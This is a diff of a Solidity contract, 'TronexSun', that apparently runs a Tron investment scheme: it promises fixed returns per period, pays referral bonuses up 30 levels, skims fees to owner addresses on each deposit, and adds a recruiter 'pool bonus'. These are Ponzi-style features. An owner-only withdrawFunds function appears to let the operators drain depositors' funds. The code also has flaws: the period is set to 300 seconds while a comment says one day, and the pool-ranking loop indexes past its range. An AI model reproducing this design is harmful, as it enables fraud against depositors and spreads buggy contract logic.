@@ -3,52 +3,62 @@ pragma solidity 0.5.4;
 contract TronexSun {
 
     struct User {
-        address upline;
-        uint256 referrals;
-        uint256 payouts;
-        uint256 direct_bonus;
-        uint256 gen_bonus;
-        uint256 deposit_amount;
-        uint256 deposit_payouts;
-        uint40 deposit_time;
-        uint256 total_deposits;
-        uint256 total_payouts;
-        uint256 total_structure;
-		uint256 team_biz;
-        uint256 isActive;
+        address upline ;
+        uint256 referrals ;
+        uint256 payouts ;
+        uint256 direct_bonus ;
+        uint256 gen_bonus ;
+        uint256 pool_bonus ;
+        uint256 deposit_amount ;
+        uint256 deposit_payouts ;
+        uint40 deposit_time ;
+        uint256 total_deposits ;
+        uint256 total_payouts ;
+        uint256 total_structure ;
+		uint256 team_biz ;
+        uint256 isActive ;
     }
 
-    address payable public owner;
-    address payable public alt_owner;
-    address payable public fee1;
-    address payable public fee2;
-	uint256 public max_receivable  = 0;
+    address payable public owner ;
+    address payable public alt_owner ;
+    address payable public fee1 ;
+    address payable public fee2 ;
  
-    uint256 constant public CONTRACT_BALANCE_STEP = 10 trx; // 1000000 trx
-    uint256 constant public MIN_DEPOSIT = 10 trx; // 50 trx
-    uint256 constant public TIME_STEP = 180 ; // 1 days
-  
-    uint256 constant public aff_bonus = 8 ; // 8 percent
- 	uint256 public team_levels = 30 ;
-    uint256 public promo_fee  = 100 ;   
-    uint256 public admin_fee1  = 30  ;   
-    uint256 public admin_fee2  = 20  ;   
-    uint256 constant public BASE_PERCENT = 120 ; // 1.2% daily (MULTIPLIER 100)
-	uint256 constant public PERCENTS_DIVIDER = 10000; 
-  
-    mapping(address => User) public users;
+    uint256 constant public CONTRACT_BALANCE_STEP = 1 trx ; // 1000000 trx
+    uint256 constant public MIN_DEPOSIT = 10 trx ; // 50 trx
+    uint256 constant public time_period = 300 ; // 1 days 
+    uint256 constant public aff_bonus = 10 ; // 10 percent
 
-    uint8[] public ref_bonuses;  
-    uint256 public total_users = 1;
-    uint256 public total_deposited;
-    uint256 public total_withdraw;
+   	uint256 constant public team_levels = 30 ;
+    uint256 public promo_fee  = 100 ;   
+    uint256 public admin_fee1  = 40 ;   
+    uint256 public admin_fee2  = 20 ;   
+
+    uint256 constant public BASE_PERCENT = 110 ; // 1.1% daily  
+	uint256 constant public PERCENTS_DIVIDER = 10000 ; 
+
+    //pool bonus
+    uint8[] public pool_bonuses ;                            // 1 => 1%
+    uint40 public pool_last_draw = uint40(block.timestamp) ;
+    uint256 public pool_cycle ;
+    uint256 public pool_balance ;
+
+    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum ;
+    mapping(uint8 => address) public pool_top ;
+    mapping(address => User) public users ;
+
+    uint8[] public ref_bonuses ;  
+    uint256 public total_users = 1 ;
+    uint256 public total_deposited ;
+    uint256 public total_withdraw ;
     
-    event Upline(address indexed addr, address indexed upline);
-    event NewDeposit(address indexed addr, uint256 amount);
-    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
-    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
-    event Withdraw(address indexed addr, uint256 amount);
-    event LimitReached(address indexed addr, uint256 amount);
+    event Upline(address indexed addr, address indexed upline) ;
+    event NewDeposit(address indexed addr, uint256 amount) ;
+    event DirectPayout(address indexed addr, address indexed from, uint256 amount) ;
+    event MatchPayout(address indexed addr, address indexed from, uint256 amount) ;
+    event PoolPayout(address indexed addr, uint256 amount) ;
+    event Withdraw(address indexed addr, uint256 amount) ;
+    event LimitReached(address indexed addr, uint256 amount) ;
 
     constructor(address payable _owner, address payable _fee1, address payable _fee2, address payable _alt_owner) public {
         owner = _owner;
@@ -65,6 +75,12 @@ contract TronexSun {
         ref_bonuses.push(5);
         ref_bonuses.push(5);
         ref_bonuses.push(5);  // 75 
+
+        pool_bonuses.push(40);
+        pool_bonuses.push(20);
+        pool_bonuses.push(15);
+        pool_bonuses.push(15);
+        pool_bonuses.push(10);
     }
  
     function _setUpline(address _addr, address _upline) private {
@@ -120,11 +136,76 @@ contract TronexSun {
 
             emit DirectPayout(users[_addr].upline, _addr,  _amount*aff_bonus/100);
         } 
-         
+         _poolDeposits(_addr, _amount);
+
+        if(pool_last_draw + time_period < block.timestamp) {
+            _drawPool();
+        }
+
          owner.transfer(_amount * promo_fee / 1000); 
          fee1.transfer(_amount * admin_fee1 / 1000); 
          fee2.transfer(_amount * admin_fee2 / 1000); 
     }
+
+     function _poolDeposits(address _addr, uint256 _amount) private {
+        pool_balance += _amount * 3 / 100;
+
+        address upline = users[_addr].upline;
+
+        if(upline == address(0)) return;
+        
+        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;
+
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            if(pool_top[i] == upline) break;
+
+            if(pool_top[i] == address(0)) {
+                pool_top[i] = upline;
+                break;
+            }
+
+            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
+                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
+                    if(pool_top[j] == upline) {
+                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
+                            pool_top[k] = pool_top[k + 1];
+                        }
+                        break;
+                    }
+                }
+
+                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
+                    pool_top[j] = pool_top[j - 1];
+                }
+
+                pool_top[i] = upline;
+
+                break;
+            }
+        }
+    } 
+
+    function _drawPool() private {
+        pool_last_draw = uint40(block.timestamp);
+        pool_cycle++;
+
+        uint256 draw_amount = pool_balance / 10;
+
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            if(pool_top[i] == address(0)) break;
+
+            uint256 win = draw_amount * pool_bonuses[i] / 100;
+
+            users[pool_top[i]].pool_bonus += win;
+            pool_balance -= win;
+
+            emit PoolPayout(pool_top[i], win);
+        }
+        
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            pool_top[i] = address(0);
+        }
+    } 
 
      function _refPayout(address _addr, uint256 _amount) private {
         address up = users[_addr].upline;
@@ -179,6 +260,20 @@ contract TronexSun {
             users[msg.sender].payouts += direct_bonus;
             to_payout += direct_bonus;
         } 
+
+          // Pool payout
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
+            uint256 pool_bonus = users[msg.sender].pool_bonus;
+
+            if(users[msg.sender].payouts + pool_bonus > max_payout) {
+                pool_bonus = max_payout - users[msg.sender].payouts;
+            }
+
+            users[msg.sender].pool_bonus -= pool_bonus;
+            users[msg.sender].payouts += pool_bonus;
+            to_payout += pool_bonus;
+        }
+
        
         // Match payout
         if(users[msg.sender].payouts < max_payout && users[msg.sender].gen_bonus > 0) {
@@ -197,8 +292,9 @@ contract TronexSun {
         
         users[msg.sender].total_payouts += to_payout;
         total_withdraw += to_payout;
-
-        msg.sender.transfer(to_payout);
+        if(to_payout > 0){
+             msg.sender.transfer(to_payout); 
+        }
 
         emit Withdraw(msg.sender, to_payout);
 
@@ -213,7 +309,7 @@ contract TronexSun {
 		uint256 total_rate = getTotalRate();
 
         if(users[_addr].deposit_payouts < max_payout) {
-            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
+            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
             if(users[_addr].deposit_payouts + payout > max_payout) {
                 payout = max_payout - users[_addr].deposit_payouts;
             }
@@ -225,7 +321,7 @@ contract TronexSun {
       uint256 total_rate = getTotalRate();
       uint256 payout;
         if(users[_addr].deposit_payouts < max_payout) {
-            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / TIME_STEP) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
+            payout = (users[_addr].deposit_amount * total_rate * ((block.timestamp - users[_addr].deposit_time) / time_period) / PERCENTS_DIVIDER) - users[_addr].deposit_payouts; 
             if(users[_addr].deposit_payouts + payout > max_payout) {
                 payout = max_payout - users[_addr].deposit_payouts;
             }
@@ -247,8 +343,12 @@ contract TronexSun {
              step2 = (steps*2 - 100)/2;
          }
          uint256 total_step = step1 + step2;
-
-		return BASE_PERCENT+total_step ;
+         uint256 total1 = BASE_PERCENT+total_step;
+         if(total1 > 500){
+             total1 = 500;
+         }
+         
+        return total1 ;
 	}
 
     /*
@@ -258,27 +358,7 @@ contract TronexSun {
 
 	function getContractBalance() public view returns (uint256) {
 		return address(this).balance;
-	} 
-
-    function getTotalSteps( uint256 _balance) external pure returns(uint256) {
-     
-        uint256 step1 = 0;
-        uint256 step2 = 0;
-        uint256 balance_trx = _balance*1000000; 
-        uint256 steps =  balance_trx/CONTRACT_BALANCE_STEP ;
-
-         if(steps <= 50){
-             step1 = steps*2;
-             step2 = 0; 
-         } else {
-             step1 = 100;
-             step2 = (steps*2 - 100)/2;
-         }
-         uint256 total_step = step1 + step2;
- 
-        return total_step ;
-    }
-
+	}  
 
 	function getRate() external view returns(uint256) {
 	 
@@ -294,8 +374,13 @@ contract TronexSun {
              step2 = (steps*2 - 100)/2;
          }
          uint256 total_step = step1 + step2;
+
+         uint256 total1 = BASE_PERCENT+total_step;
+         if(total1 > 500){
+             total1 = 500;
+         }
          
-        return BASE_PERCENT+total_step ;
+        return total1 ;
 	}
 
     function getContractBonus() external view returns(uint256) {
@@ -312,18 +397,17 @@ contract TronexSun {
              step2 = (steps*2 - 100)/2;
          }
          uint256 total_step = step1 + step2; 
+         if(total_step > 390){
+             total_step = 390;
+         }
         return total_step ;
-    }
-
+    } 
 
     function maxPayoutOf(uint256 _amount) external view returns(uint256) {
-		if(max_receivable > 0){
-			return  _amount * max_receivable / 100;
-		} else {
-        return 	_amount * 300 / 100; 
-		}
-    }
- 
+		 
+			return  _amount * 320 / 100;
+	  
+    } 
 
 	function getUserBalance(address _addr) external view returns (uint256) {
         (uint256 to_payout, uint256 max_payout) = this.payoutOf(_addr); 
@@ -355,18 +439,24 @@ contract TronexSun {
             } 
             to_payout += gen_bonus;
         } 
- 
+
+          // Pool payout
+        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {
+            uint256 pool_bonus = users[msg.sender].pool_bonus;
+
+            if(users[msg.sender].payouts + pool_bonus > max_payout) {
+                pool_bonus = max_payout - users[msg.sender].payouts;
+            }  
+            to_payout += pool_bonus;
+        }
+
         if(users[_addr].payouts >= max_payout) {
 			return 0;       
 		 } else {
 			 return to_payout;
 		 }
     }
-  
-	function changeMaxRec(uint256 _maxRecPercent) public {
-		require(msg.sender == owner || msg.sender == alt_owner, "Not allowed");
-		max_receivable = _maxRecPercent;
-	} 
+   
 
 	function withdrawFunds() public {
 		require(msg.sender == owner || msg.sender == alt_owner, "Not allowed");
@@ -396,16 +486,29 @@ contract TronexSun {
         return block.timestamp;
     }
 
-    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status  ) {
+    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus , uint256 gen_bonus, uint256 user_status) {
         return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].gen_bonus, users[_addr].isActive  );
+    }
+
+    function poolBonus(address _addr) view external returns(uint256){
+        return users[_addr].pool_bonus;
     }
 
     function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure, uint256 team_biz, uint256 deposit_payouts) {
         return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure, users[_addr].team_biz, users[_addr].deposit_payouts);
     }
 
-    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw ) {
-        return (total_users, total_deposited, total_withdraw );
+    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider ) {
+        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]] );
     }
      
+     
+    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {
+        for(uint8 i = 0; i < pool_bonuses.length; i++) {
+            if(pool_top[i] == address(0)) break;
+
+            addrs[i] = pool_top[i];
+            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
+        }
+    }
 }
